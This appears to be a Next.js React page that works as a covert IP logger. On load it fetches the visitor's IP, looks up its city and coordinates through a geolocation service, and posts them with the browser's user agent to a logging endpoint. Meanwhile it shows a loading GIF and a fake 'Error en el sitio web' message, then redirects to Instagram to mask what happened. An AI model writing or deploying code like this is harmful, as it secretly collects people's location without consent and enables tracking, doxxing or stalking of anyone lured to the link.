'use client';
import { useEffect, useState } from 'react';
import styles from "./page.module.css";

export default function Home() {
  const [showGif, setShowGif] = useState(true);
  const [showError, setShowError] = useState(false);

  useEffect(() => {
    async function logIPandLocation() {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const { ip } = await ipRes.json();

      const locationRes = await fetch(`https://ipwho.is/${ip}`);
      const locationData = await locationRes.json();

      const logData = {
        ip,
        location: {
          country: locationData.country,
          regionName: locationData.region,
          city: locationData.city,
          lat: locationData.latitude,
          lon: locationData.longitude,
        },
        userAgent: navigator.userAgent
      };

      await fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(logData),
      });
    }

    logIPandLocation();

    const gifTimer = setTimeout(() => {
      setShowGif(false);
      setShowError(true);

      setTimeout(() => {
        window.location.href = 'https://www.instagram.com/';
      }, 1000);

    }, 2000);

    return () => clearTimeout(gifTimer);
  }, []);

  return (
    <>
      <div className={styles.page}>
        <main className={styles.main}>
          {showGif ? (
            <img src="/holli-would-dancing.gif" alt="Cargando..." width="214" height="240" />
          ) : (
            <p>Error en el sitio web</p>
          )}
        </main>
      </div>
    </>
  );
}
